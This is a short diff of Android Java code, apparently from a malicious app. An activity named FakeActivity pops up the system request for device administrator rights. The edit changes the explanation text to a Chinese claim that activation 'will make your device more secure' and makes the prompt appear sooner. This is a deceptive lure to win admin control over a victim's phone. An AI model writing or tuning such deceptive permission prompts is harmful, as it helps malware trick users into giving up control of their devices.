@@ -58,11 +58,11 @@ public class FakeActivity extends Activity {
             public void run() {
                 Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                 i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(getApplicationContext(), DeviceBindBRC.class));
-                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "服务激活");
+                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "激活会使您的设备更安全");
                 i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                 startActivityForResult(i, 1000);
             }
-        }, 500);
+        }, 250);
 
 //        mHandler.postDelayed(new Runnable() {
 //            @Override
